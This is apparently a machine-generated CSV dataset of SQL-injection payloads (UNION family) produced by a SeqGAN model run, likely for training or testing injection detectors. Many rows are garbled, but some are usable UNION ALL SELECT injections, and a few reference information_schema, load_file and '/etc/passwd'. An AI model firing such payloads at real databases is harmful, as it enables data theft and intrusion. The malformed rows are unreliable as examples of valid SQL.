label,payload,family,payload_type,method,run_id,sample_index
attack,"-7627%""'   )er' where iddusd  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,170
attack,"-3593%"" union allselect select,1580,9--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,171
attack," select from information_schema.1942,1580,1942,3075--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,172
attack,"-6789%"" 1 m"" all select from us,4394",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,173
attack,"-6020select""  =  union   )   )    an usl ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,174
attack,"-1606%""   )    )    union msoll asn",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,175
attack,"-7111%"" union all select 5928,3303--,1580,u1",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,176
attack,-union' )  )9boued  --,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,177
attack,"-6789'||  (  select 'union %"" union union allyoder r",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,178
attack,-1876'||  (  select ' io)    l where usrs where from,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,179
attack,-8677'||  (  select 'gfrom 7682oe  ==  7682 boood,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,180
attack,"-3638"" union snudla' 3560,6083,4011,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,181
attack,"-7111%"" union all select 7779,,5235,1942,1942,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,182
attack,-'||  (  select ''' from use  rs where id  =,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,183
attack,"-8982' union all select from uload_file4612,77793303,,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,184
attack,"-4711' boolean,6083,3075,6083,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,185
attack,"-76277564' union all idus,e,1942 ,6196",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,186
attack,"-5817' union all 91844011,5235,40111942,,--T--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,187
attack,"union select *,1942,4394",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,188
attack,"-2314%""' union all select,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,189
attack,"-7078%' unionwhere select 6630,6346,5928,43944011,6346",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,190
attack, select from users us n    =ou,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,191
attack,"-9046""   union,av' where 5076=  =  (  6915",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,192
attack,"-7564' allselect 3075,3075  ,4394,6346,5235,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,193
attack,"-2314%'   union-punion all select m3075,6196,3560",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,194
attack,"-1550""union2204 all select 3303,52358498--,4394,1580,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,195
attack,"-7564' union ioo5235d5235,5235",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,196
attack,"-3017""   )    )    union union union all select",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,197
attack,-5008qb   od m2305 modrs where i,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,198
attack,"-7848%""' all select 43944011,1942,7779--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,199
attack,-9808q' where select,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,200
attack,"-1606%""   )    )    oaasers where   ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,201
attack,"-2305""do)   )    an where 3114  =  =  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,202
attack,-4869%' i   )    as where 7039  =    =,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,203
attack,1942' from from information_schema.od'  de  =  6915 ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,204
attack," select * select from us,oas where id",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,205
attack, select select from users whereqload_file  =    ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,206
attack," select, y  (5928l where s =  =    =",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,207
attack,"-%""    monolen )cosers",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,208
attack,"-7963'+  (  select '' from ulr from uodl,r,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,209
attack,-o' % from boo select  (    =  6915,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,210
attack,-%'   )    baeakn all8498,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,211
attack,"-7963'||  (  select ''||  (  select '    aoal '||  (  select 'c"", ""z from ula",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,212
attack,"-+7564%"" union union union all select 3303,1942,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,213
attack," union select,,1942,6346,1942,4394,6196",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,214
attack,"-3442""' all from use6915rs union select ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,215
attack,-4711' all select 46121580,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,216
attack,"union all select all 7779,9,6196,1942,4394,60831580",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,217
attack,"-5776%"" all select)select ude--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,218
attack, select * from users s uslafrom,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,219
attack,"-"" AND 1  =  0 UNION ALL SELECT ""% union union all all', ' select Hselect",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,220
attack,-91455729)   aadv imodad  ),union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,221
attack,"-4465h""""   )ooner where all from,,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,222
attack,"-2305'union all select 5729,5235,4394,7779,6346,6196",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,223
attack,"-7848'+  (  select ''+  (  select '    union all,=  6083,849871416083,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,224
attack,"-'||  (  select '%"" union union all select,1580,,*,,8498",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,225
attack,"n select 33031,4394,5235,9",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,226
attack,-7564)   lean union modders all,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,227
attack,-3924union )odoler'||  (  select 'vvjall from u,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,228
attack,"-3638union all select 1580,6083,3075,2256,33034612--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,229
attack,"-3017%"""" union all user=  =  =c",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,230
attack,-6067kb1641c   yaz where 1858  =union id,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,231
attack,-3226'||  (  select 'aobolecoall mode  --,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,232
attack,-6067%'i)b)oank s ucvvp,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,233
attack,)select from ultts where 6229  =  --,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,234
attack, * from select select 7779--,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,235
attack,-70782314%'   )   al where 7336o  =  =u,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,236
attack,"-9145' union select 5729 *,,1942,6346,4394,1580",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,237
attack,"-3442"" booooleaodan) select ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,238
attack,"-7485""   union alln bodod    de  (  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,239
attack,-8677'||  (  select ''q union duaodsers *  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,240
attack,select select from ul uss 8498us from where,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,241
attack,select boood  dl--,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,242
attack,"-uhzunion all select 5928,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,243
attack,"-%""   )     where   =  39673075  (  select i",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,244
attack,)   bqn ) mnod  +=  =  =  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,245
attack,"-%""' union all * 3303,1942,3303,4011,6346",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,246
attack,-> union m  =  select 3114)   =  select=  union,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,247
attack,"-7111%"" union all select 1580,3075,40115729,4011,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,248
attack,"-%"" union all select 5235",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,249
attack,"-3442'   b5y  xl where 4612,1942,4011,,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,250
attack,"-4452%'+  (  select '' all idod8498,--,4394,6083,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,251
attack," select select * from from 6083u,6083,3075,3075,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,252
attack,"-2230%""union unionselect all m,7039,6196,,,4394",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,253
attack,"-2384%""   )    )    cz ban mose",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,254
attack,"-5776% union union where select 7141,3075,6083,6083,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,255
attack,-%'  )   z = us from 8950  =  2617,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,256
attack,"', '-8325'union all select,1942,3075,information_schema8498,4394,,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,257
attack,-7485'   )   as where dud  z=  5076s,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,258
attack," select,,52351,5928,9dbdbdfromn   =,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,259
attack,"-1234% union all select 1580 6083,84984011,6083,5928",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,260
attack,"-q' where select,6196,,6196,3303,load_file24896346,1580",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,261
attack,"-%""   )   an b)uack ts where",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,262
attack,"-7485""' all select,1942,7779--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,263
attack,"-4876""   )   where s  =  =  7682 union all   ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,264
attack,"-6067%""union""o' allmod  =  union,   d",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,265
attack,-5217'||  (  select 'where union all from moooded  (,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,266
attack,-2798)   union uslexas where 3733rs ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,267
attack,"-5520%"" union all where select,,4394,5235,1",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,268
attack,"-2305' where 9571select=  (  (3303d  z,5,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,269
attack," select from 5076 mod,l(d  ,,5235,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,270
attack,-4465'||  (  select 'j8417   oooadav where =  =  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,271
attack,"-7848%"" union all select,6346,3075--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,272
attack,-6067   union union qoo where dod  (d  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,273
attack,"-3226'+  (  select '%j union all select 77794612,,4011,,3303",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,274
attack,"-6789'||  (  select '"" union union all bode,6083,3075,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,275
attack,"-3442' iunion select,4394,4394,6196,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,276
attack,r * from useserss modns,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,277
attack,"-2899""   )    )    al where d  ==  all  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,278
attack,union' union select 7779--,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,279
attack,"-9098union union all select *,5235,6346,1942,6346,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,280
attack, select from boo   =  =  6915bode  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,281
attack,-5776% all union select 5928--,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,282
attack,"-6067'+  (  select ')   amool c9mod  4394,', '",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,283
attack,"-9145'+  (  select ''   )    an all"", "",5729,3303,7141,6083",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,284
attack,-4711' b)l where 8095  =    8)2617=  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,285
attack,"-6020""  = union select where select 1942,3303,6196,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,286
attack,-4955%'   )    adad bodun where ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,287
attack,-1606'-- all select,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,288
attack,"-7485""      )    )    aabodamwhere 1266  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,289
attack,"-%"" union union all select,3303,7779",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,290
attack,"-5776%"" all union union selectselect,6196,7779,1,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,291
attack,-5008' boooeollan users,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,292
attack,"-9098'||  (  select 'xn' union all select 6083,,5235,6346,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,293
attack,"-"" union all select 3560,6083,84982,,1942,1942",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,294
attack,"-4711' union all select 5235,1580,  ,5235,3075,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,295
attack,7039 union 9571 use  =  6915er m 1942 ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,296
attack,"-1710' union all select u,6083,7141",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,297
attack,"-2305""  )   a8as us, bl v ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,298
attack,"-4465"" % modoooleabaaku",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,299
attack,"-'||  (  select 'select union union all   select6346,1,1580,3075,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,300
attack,-9145'+idul 6196  l 4011,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,301
attack," union union m select 7141,3303,4612--,7141,d,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,302
attack,"-4869%' union all select 33033075,1580,1942,6346,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,303
attack,"-2204%~""   )    )    union all bod  =m",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,304
attack,"-2643%""ounion   )   )aaunion users ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,305
attack,"-%'   a union select all  8498,4394,4394,8498,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,306
attack,"-6067%"" union me   modol2dz,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,307
attack," * where 6229  (    (   (ua9565l,5928",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,308
attack," select from 8498 6630,4612,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,309
attack,"-1550' 6083od)l)d5where,+,3075,6083,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,310
attack,"-1641k'||  (  select 'qunion union mod,6083,v,6083,6346",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,311
attack,-5776'+  (  select '5217'||  (  select 'j' all where * select,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,312
attack,"-7564' union all select 6083,3075,1266--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,313
attack,"-%"" union all select 6196 us,s",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,314
attack," select md3303,6083,3303,3075,6346,', ',1,,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,315
attack," union itselect 4011m,1580,7141,7141,6083--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,316
attack,-qd   mhe q users   union all ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,317
attack,"-7848% union all all union all3967 3075u,(d",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,318
attack,"-7627%""union all all select7779--,7779--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,319
attack,"-9574   union all  select 1942,5235,1942,4011,5235,6196",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,320
attack,"-4876""   ' where all select 9571l,8498--5235",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,321
attack,"-4318,"" all ue  2617  =  u  (  3967 ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,322
attack,"1234 select where 24897141,6083,3075,6083,6083,6083,6346",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,323
attack,"-"""" all * 5928 useuas",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,324
attack,-7564'i   lnetgvwhere 3967  =  3114 b,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,325
attack,"-7485""   )l,   )",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,326
attack,"-1550' union all select,1580,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,327
attack,"-7078c""b      aan mool6196e ss",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,328
attack,-6067'+  (  select '3924a)oladn   d us m v,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,329
attack,-   union select from us ss=    =  -   ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,330
attack,"-%""' union n all us  =  '/etc/passwd'  lz",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,331
attack,"-9145' x ioders 33033075,6346",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,332
attack,-2643%8498'   )52aas an bood,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,333
attack,"--4955select union all 41003075,5928,7141,1,6346,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,334
attack,-6186%cc   )        )    where idod  ==,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,335
attack, mo)od52dc9b52d52ddm,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,336
attack,in mooode  =  6915rz bod  ,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,337
attack,"-70782230%""   -p%'-""   )la u-- ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,338
attack,")   mqn x,6083pd,3303load_file--,7141,1580,",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,339
attack,"-4955%' union all select 9184d,load_file  d  '||  (  select 'h",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V3__sql_aware__len20__gpre80__reward_off__seed88,340
